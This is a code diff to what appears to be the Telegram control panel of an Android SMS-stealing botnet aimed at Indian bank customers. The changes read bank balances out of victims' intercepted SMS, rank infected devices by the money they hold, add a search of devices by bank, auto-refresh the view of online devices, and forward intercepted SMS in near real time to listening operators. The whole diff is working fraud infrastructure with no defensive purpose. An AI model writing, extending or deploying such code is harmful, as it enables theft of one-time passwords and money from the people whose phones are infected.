@@ -1331,16 +1331,32 @@ async function checkDeviceBalance(uid, chatId, deviceId) {
 // ============================================================
 // BANK SERVICE SCREEN (highest balance first)
 // ============================================================
+const _balanceRefreshAt = {};
+async function ensureFreshBalances(uid) {
+  if ((_balanceRefreshAt[uid] || 0) && Date.now() - _balanceRefreshAt[uid] < 60000) return;
+  _balanceRefreshAt[uid] = Date.now();
+  try { await scanUserDevices(uid, true); } catch (e) {}
+}
+
 async function showBankService(uid, chatId, messageId = null, edit = false, scope = 'user') {
   const user = getUserData(uid);
+  // Refresh balance mining from device SMS (throttled once/60s per user;
+  // admin scope refreshes every user). Without this, g.totalBalance stays 0.
+  try {
+    if (scope === 'admin') {
+      for (const u of Object.keys(state.users || {})) await ensureFreshBalances(u);
+    } else {
+      await ensureFreshBalances(uid);
+    }
+  } catch (e) {}
   const devices = [];
   if (scope === 'admin') {
     for (const [id, g] of Object.entries(state.global_devices)) {
-      devices.push({ ...g, id, totalBalance: g.totalBalance || 0, banks: g.banks || [] });
+      devices.push({ ...g, id, totalBalance: g.totalBalance || Object.values(g.balanceByBank || {}).reduce((s, b) => s + (b?.balance || 0), 0), banks: g.banks || [] });
     }
   } else {
     for (const [id, g] of Object.entries(state.global_devices)) {
-      if (g.owner_uid === String(uid)) devices.push({ ...g, id, totalBalance: (user.bank_balances || {})[id] ? Object.values(user.bank_balances[id]).reduce((s, b) => s + (b?.balance || 0), 0) : (g.totalBalance || 0), banks: g.banks || [] });
+      if (g.owner_uid === String(uid)) devices.push({ ...g, id, totalBalance: (user.bank_balances || {})[id] ? Object.values(user.bank_balances[id]).reduce((s, b) => s + (b?.balance || 0), 0) : (g.totalBalance || Object.values(g.balanceByBank || {}).reduce((s, b) => s + (b?.balance || 0), 0)), banks: g.banks || [] });
     }
   }
   devices.sort((a, b) => b.totalBalance - a.totalBalance);
@@ -1350,7 +1366,8 @@ async function showBankService(uid, chatId, messageId = null, edit = false, scop
   if (top.length === 0) lines.push('_No devices yeth_');
   for (const dev of top) {
     const bal = fmtAmount(dev.totalBalance);
-    lines.push(`🟢 **${dev.name}** — ${bal}`);
+    const banksLine = (dev.banks || []).length ? ` • ${dev.banks.join(', ')}` : '';
+    lines.push(`🟢 **${dev.name}** — ${bal}${banksLine}`);
     buttons.push([{ text: `🟢 ${dev.name} — ${bal}`, callback_data: `dev_${dev.id}` }]);
   }
   lines.push('', '📌 **Options:**');
@@ -1449,21 +1466,39 @@ async function showAdminDevices(uid, chatId, messageId = null, page = 0, edit = 
   const text = lines.join('\n');
   if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
   else await sendMessage(chatId, text, buttons);
+
+  // Realtime auto-refresh of the ONLINE ONLY view — refreshed by the
+  // background sweep (see adminWatchRefresh) while this view is open.
+  if (onlineOnly && chatId && messageId) {
+    state._adminOnlineWatch = { uid, chatId, messageId, page, onlineOnly: true, ts: Date.now(), lastRefresh: 0 };
+  } else if (state._adminOnlineWatch && state._adminOnlineWatch.uid === uid) {
+    delete state._adminOnlineWatch;
+  }
 }
 
 async function adminBankSearch(uid, chatId, messageId = null, edit = false) {
   if (!isAdmin(uid)) return;
   setAwaiting(uid, 'state', 'admin_bank_search');
   const quick = [
-    [{ text: '🏦 SBI', callback_data: 'abank_SBI' }, { text: '🔵 HDFC', callback_data: 'abank_HDFC' }],
-    [{ text: '🔴 ICICI', callback_data: 'abank_ICICI' }, { text: '🟠 Axis', callback_data: 'abank_Axis' }],
-    [{ text: '🟣 Kotak', callback_data: 'abank_Kotak' }, { text: '🟤 PNB', callback_data: 'abank_PNB' }],
-    [{ text: '🔙 Back', callback_data: 'admin_menu' }]
+    [{ text: '🏠 Back to Admin', callback_data: 'admin_menu' }]
   ];
+  // Build bank list from devices actually present in the registry, so the
+  // search page shows every real bank with count (not a fixed subset).
+  const bankCounts = {};
+  for (const g of Object.values(state.global_devices || {})) {
+    for (const b of (g.banks || [])) {
+      bankCounts[b] = (bankCounts[b] || 0) + 1;
+    }
+  }
+  for (const [bank, cnt] of Object.entries(bankCounts).sort((a, b) => b[1] - a[1])) {
+    quick.splice(quick.length - 1, 0, [{ text: `🏦 ${bank} (${cnt})`, callback_data: `abank_${bank}` }]);
+  }
   const lines = [
     '🔍 **Search Device by Bank**', '═══════════════════════', '',
     'Bank ka naam likho ya neeche se select karo:',
     'Example: `sbi`, `hdfc`, `kotak`, `axis`…', '',
+    Object.keys(bankCounts).length ? `Found banks: ${Object.keys(bankCounts).join(', ')}` : '⚠️ Abhi kisi device mein bank read nahi hua — SMS store empty hai.',
+    '',
     '⚠️ Search online + recent devices me se hota hai.',
     'Send `/cancel` to cancel.'
   ];
@@ -1828,7 +1863,10 @@ async function handleCallback(update) {
         return;
       }
 
-      case 'admin_menu': return showAdminMenu(uid, chatId, msgId, true);
+      case 'admin_menu': {
+        if (state._adminOnlineWatch && state._adminOnlineWatch.uid === uid) delete state._adminOnlineWatch;
+        return showAdminMenu(uid, chatId, msgId, true);
+      }
       case 'admin_devices': return showAdminDevices(uid, chatId, msgId, 0, true, false);
       case 'admin_online': return showAdminDevices(uid, chatId, msgId, 0, true, true);
       case 'admin_bank_service': return showBankService(uid, chatId, msgId, true, 'admin');
@@ -1865,6 +1903,7 @@ async function handleCallback(update) {
     }
 
     if (data.startsWith('adev_')) {
+      if (state._adminOnlineWatch && state._adminOnlineWatch.uid === uid) delete state._adminOnlineWatch;
       const deviceId = data.substring(5);
       const g = state.global_devices[deviceId];
       // admin hub — set user's active to this device so commands use stored fbUrl
@@ -2268,6 +2307,16 @@ async function backgroundSweepOnce() {
       }
     }
     await Promise.all(jobs);
+    // Realtime refresh of the admin ONLINE-ONLY device view (while open).
+    try {
+      const w = state._adminOnlineWatch;
+      if (w && w.ts && (Date.now() - w.ts < 600000) && (!w.lastRefresh || Date.now() - w.lastRefresh > 15000)) {
+        w.lastRefresh = Date.now();
+        await showAdminDevices(w.uid, w.chatId, w.messageId, w.page || 0, true, true);
+      }
+    } catch (e) {}
+    // instant SMS forwarding for listening users (near-real-time sweep).
+    try { await throttledSmsForward(); } catch (e) {}
     saveState();
   } catch (e) {
     console.error('Sweep error:', e.message);
